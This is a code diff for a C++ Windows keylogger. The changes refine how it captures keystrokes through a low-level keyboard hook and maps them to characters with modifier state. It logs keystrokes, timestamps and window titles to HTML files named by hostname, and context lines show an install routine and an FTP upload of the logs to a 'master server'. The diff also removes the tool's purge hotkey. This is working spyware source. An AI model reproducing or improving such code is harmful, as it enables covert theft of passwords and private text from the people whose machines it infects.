@@ -135,8 +135,10 @@ KeyLogger::KeyLogger() {
 
     lshiftDown = false;
     rshiftDown = false;
-    altDown = false;
-    ctrlDown = false;
+    laltDown = false;
+    raltDown = false;
+    lctrlDown = false;
+    rctrlDown = false;
 
     char buffer[1024];
     GetModuleFileName(NULL, buffer, sizeof(buffer));
@@ -151,6 +153,63 @@ KeyLogger::KeyLogger() {
     char hostnameBuff[200];
     gethostname(hostnameBuff, sizeof(hostnameBuff));
     hostname = hostnameBuff;
+
+    mapKeys();
+}
+
+void KeyLogger::mapKeys() {
+
+    char ASCII[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890²&é\"'(-è_çà~#{[|`\\^@)=°+]}¨$£¤ù%*µ!§:/;.,?<>";
+
+    for (int i = 0; i < sizeof(ASCII); i++) {
+        kbdToAscii[VkKeyScanEx(ASCII[i], GetKeyboardLayout(NULL))] = ASCII[i];
+    }
+
+    specialKeys[VK_SPACE] = " ";
+    specialKeys[VK_BACK] = "[BACKSPACE]";
+    specialKeys[VK_TAB] = "[TAB]";
+    specialKeys[VK_RETURN] = "[RETURN]<br />";
+    specialKeys[VK_PAUSE] = "[PAUSE]";
+    specialKeys[VK_CAPITAL] = "[CAPS LOCK]";
+    specialKeys[VK_ESCAPE] = "[ESC]";
+    specialKeys[VK_PRIOR] = "[PAGE UP]";
+    specialKeys[VK_NEXT] = "[PAGE DOWN]";
+    specialKeys[VK_HOME] = "[HOME]";
+    specialKeys[VK_LEFT] = "[LEFT ARROW]";
+    specialKeys[VK_RIGHT] = "[RIGH ARROW]";
+    specialKeys[VK_UP] = "[UP ARROW]";
+    specialKeys[VK_DOWN] = "[DOWN ARROW]";
+    specialKeys[VK_INSERT] = "[INSERT]";
+    specialKeys[VK_DELETE] = "[DELETE]";
+    specialKeys[VK_LWIN] = "[LEFT WINDOWS]";
+    specialKeys[VK_RWIN] = "[RIGHT WINDOWS]";
+    specialKeys[VK_NUMLOCK] = "[NUMLOCK]";
+    specialKeys[VK_NUMPAD0] = "[NUM 0]";
+    specialKeys[VK_NUMPAD1] = "[NUM 1]";
+    specialKeys[VK_NUMPAD2] = "[NUM 2]";
+    specialKeys[VK_NUMPAD3] = "[NUM 3]";
+    specialKeys[VK_NUMPAD4] = "[NUM 4]";
+    specialKeys[VK_NUMPAD5] = "[NUM 5]";
+    specialKeys[VK_NUMPAD6] = "[NUM 6]";
+    specialKeys[VK_NUMPAD7] = "[NUM 7]";
+    specialKeys[VK_NUMPAD8] = "[NUM 8]";
+    specialKeys[VK_NUMPAD9] = "[NUM 9]";
+    specialKeys[VK_MULTIPLY] = "*";
+    specialKeys[VK_ADD] = "+";
+    specialKeys[VK_SUBTRACT] = "-";
+    specialKeys[VK_DIVIDE] = "/";
+    specialKeys[VK_F1] = "[F1]";
+    specialKeys[VK_F2] = "[F2]";
+    specialKeys[VK_F3] = "[F3]";
+    specialKeys[VK_F4] = "[F4]";
+    specialKeys[VK_F5] = "[F5]";
+    specialKeys[VK_F6] = "[F6]";
+    specialKeys[VK_F7] = "[F7]";
+    specialKeys[VK_F8] = "[F8]";
+    specialKeys[VK_F9] = "[F9]";
+    specialKeys[VK_F10] = "[F10]";
+    specialKeys[VK_F11] = "[F11]";
+    specialKeys[VK_F12] = "[F12]";
 }
 
 KeyLogger::~KeyLogger() {
@@ -175,6 +234,12 @@ void KeyLogger::releaseInstance() {
     }
 }
 
+std::string KeyLogger::keycodeToString(int keyCode) {
+    std::string text;
+    text += kbdToAscii[keyCode];
+    return text;
+}
+
 LRESULT KeyLogger::hookFunction(int nCode, WPARAM wParam, LPARAM lParam) {
 
     KeyLogger* keylogger = getInstance();
@@ -186,61 +251,28 @@ LRESULT KeyLogger::hookFunction(int nCode, WPARAM wParam, LPARAM lParam) {
 
             KBDLLHOOKSTRUCT hooked = *((KBDLLHOOKSTRUCT*) lParam);
 
-            if (hooked.scanCode == HOTKEY_PURGE) {
-                keylogger->uninstall();
-            }
-
-            switch(hooked.scanCode) {
-
-                case SC_LSHIFT:
-                    if (!keylogger->isLShiftDown()) {
-                        keylogger->setLShiftDown(true);
-                        keylogger->log("[LSHIFT]");
-                    }
+            switch (hooked.vkCode) {
+                case VK_LSHIFT:
+                    keylogger->setLShiftDown(true);
                     break;
-                case SC_RSHIFT:
-                    if (!keylogger->isRShiftDown()) {
-                        keylogger->setRShiftDown(true);
-                        keylogger->log("[RSHIFT]");
-                    }
+                case VK_RSHIFT:
+                    keylogger->setRShiftDown(true);
                     break;
-                case SC_ALT:
-                    if (!keylogger->isAltDown()) {
-                        keylogger->setAltDown(true);
-                        keylogger->log("[ALT]");
-                    }
+                case VK_LMENU:
+                    keylogger->setLAltDown(true);
                     break;
-                case SC_CTRL:
-                    if (!keylogger->isCtrlDown()) {
-                        keylogger->setCtrlDown(true);
-                        keylogger->log("[CTRL]");
-                    }
+                case VK_RMENU:
+                    keylogger->setRAltDown(true);
                     break;
-                case SC_SPACE:
-                    keylogger->log(" ");
+                case VK_LCONTROL:
+                    keylogger->setLCtrlDown(true);
                     break;
-                case SC_ENTER:
-                    keylogger->log("[ENTER]<br />");
-                    break;
-                case SC_TAB:
-                    keylogger->log("[TAB]");
-                    break;
-                case SC_BACKSPACE:
-                    keylogger->log("[BACKSPACE]");
-                    break;
-                case SC_CAPSLOCK:
-                    keylogger->log("[CAPSLOCK]");
-                    break;
-                case SC_ESCAPE:
-                    keylogger->log("[ESCAPE]");
+                case VK_RCONTROL:
+                    keylogger->setRCtrlDown(true);
                     break;
                 default:
-                    DWORD key = 1;
-                    key += hooked.scanCode << 16;
-                    key += hooked.flags << 24;
-                    char keyText[100];
-                    GetKeyNameText(key, keyText, sizeof(keyText));
-                    keylogger->log(keyText);
+                    keylogger->log(hooked.vkCode);
+                    break;
             }
         }
 
@@ -249,23 +281,25 @@ LRESULT KeyLogger::hookFunction(int nCode, WPARAM wParam, LPARAM lParam) {
 
             KBDLLHOOKSTRUCT hooked = *((KBDLLHOOKSTRUCT*) lParam);
 
-            switch(hooked.scanCode) {
+            switch(hooked.vkCode) {
 
-                case SC_LSHIFT:
+                case VK_LSHIFT:
                     keylogger->setLShiftDown(false);
-                    keylogger->log("[/LSHIFT]");
                     break;
-                case SC_RSHIFT:
+                case VK_RSHIFT:
                     keylogger->setRShiftDown(false);
-                    keylogger->log("[/RSHIFT]");
                     break;
-                case SC_ALT:
-                    keylogger->setAltDown(false);
-                    keylogger->log("[/ALT]");
+                case VK_LMENU:
+                    keylogger->setLAltDown(false);
                     break;
-                case SC_CTRL:
-                    keylogger->setCtrlDown(false);
-                    keylogger->log("[/CTRL]");
+                case VK_RMENU:
+                    keylogger->setRAltDown(false);
+                    break;
+                case VK_LCONTROL:
+                    keylogger->setLCtrlDown(false);
+                    break;
+                case VK_RCONTROL:
+                    keylogger->setRCtrlDown(false);
                     break;
                 default:
                     break;
@@ -318,7 +352,7 @@ void KeyLogger::listen() {
     
     CreateDirectory(std::string(programDir + DATADIR).c_str(), NULL);
 
-    logFileName << programDir << DATADIR << "\\" << time(NULL) << ".html";
+    logFileName << programDir << DATADIR << "\\" << hostname << "(" << time(NULL) << ").html";
     
     ifstream logCheck(logFileName.str());
     bool exists = logCheck.good();
@@ -327,7 +361,36 @@ void KeyLogger::listen() {
     logFile.open(logFileName.str(), ios::app);
     if (!exists) {
         logFile << TABLE_CSS;
-        logFile << "<table class=\"table\"><tr><td>Time</td><td>Host</td><td>Window</td><td width=\"50%\">Key strokes</td></tr>";
+        logFile << "<table class=\"table\"><tr><td>Time</td><td>Window</td><td width=\"50%\">Key strokes</td></tr>";
+    }
+}
+
+void KeyLogger::log(int vkCode) {
+
+    std::map<int, std::string>::iterator found = specialKeys.find(vkCode);
+    
+    if (found != specialKeys.end()) {
+        log(found->second);
+    }
+
+    else {
+        // formatting scan code and shift state for the VkKeyScan function 
+        // http://msdn.microsoft.com/en-us/library/windows/desktop/ms646329%28v=vs.85%29.aspx
+        int keyCode = 0;
+        if (isLShiftDown() || isRShiftDown()) {
+            keyCode += 1;
+        }
+        if (isLCtrlDown() || isRCtrlDown()) {
+            keyCode += 2;
+        }
+        if (isLAltDown() || isRAltDown()) {
+            keyCode += 4;
+        }
+        keyCode = keyCode << 8;
+        keyCode += vkCode;
+
+        std::string keyString = keycodeToString(keyCode);
+        log(keyString);
     }
 }
 
@@ -359,7 +422,7 @@ void KeyLogger::install(std::string target) {
 
 void KeyLogger::writeBuffer()
 {
-    logFile << "<tr><td>" << getTimeString() << "</td><td>" << hostname << "</td><td>" << getActiveWindowTitle() << "</td><td style=\"word-wrap: break-word\">" << keyboardBuffer << "</td></tr>";
+    logFile << "<tr><td>" << getTimeString() << "</td><td>" << activeWindowTitle << "</td><td style=\"word-wrap: break-word\">" << keyboardBuffer << "</td></tr>";
     #ifdef USE_FTP
     //upload to master server if it's time
     if (useFTP && time(NULL) - lastUpload > UPLOAD_DELTA) {
@@ -404,8 +467,6 @@ std::string KeyLogger::getUserHomeDirectory() {
 
     return std::string(buffer);
 }
-
-
 
 #ifdef USE_FTP
 void KeyLogger::upload() {
